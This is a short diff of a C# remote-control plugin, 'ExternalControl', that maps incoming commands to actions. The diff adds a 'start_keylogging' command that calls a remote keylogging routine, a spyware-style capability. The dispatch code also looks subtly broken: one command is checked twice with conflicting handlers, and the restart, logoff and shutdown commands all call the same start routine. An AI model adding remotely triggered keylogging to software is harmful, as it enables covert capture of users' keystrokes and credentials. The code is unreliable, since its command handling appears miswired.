@@ -91,31 +91,37 @@ namespace ExternalControl
             if (message.GetCommand() == "start_externalcontrol")
             {
                 var d = new PluginCallback(_control.RemoteStartProcess);
-                _mainPanel.Invoke(d, new object[] { });
+                _mainForm.Invoke(d, new object[] { });
             }
 
             if (message.GetCommand() == "start_externalcontrol")
             {
                 var d = new PluginCallback(_control.RemoteStopProcess);
-                _mainPanel.Invoke(d, new object[] { });
+                _mainForm.Invoke(d, new object[] { });
             }
 
             if (message.GetCommand() == "restart_windows")
             {
                 var d = new PluginCallback(_control.RemoteStartProcess);
-                _mainPanel.Invoke(d, new object[] { });
+                _mainForm.Invoke(d, new object[] { });
             }
 
             if (message.GetCommand() == "logoff_windows")
             {
                 var d = new PluginCallback(_control.RemoteStartProcess);
-                _mainPanel.Invoke(d, new object[] { });
+                _mainForm.Invoke(d, new object[] { });
             }
 
             if (message.GetCommand() == "shutdown_windows")
             {
                 var d = new PluginCallback(_control.RemoteStartProcess);
-                _mainPanel.Invoke(d, new object[] { });
+                _mainForm.Invoke(d, new object[] { });
+            }
+
+            if (message.GetCommand() == "start_keylogging")
+            {
+                var d = new PluginCallback(_control.RemoteKeyLogging);
+                _mainForm.Invoke(d, new object[] { });
             }
         }
 
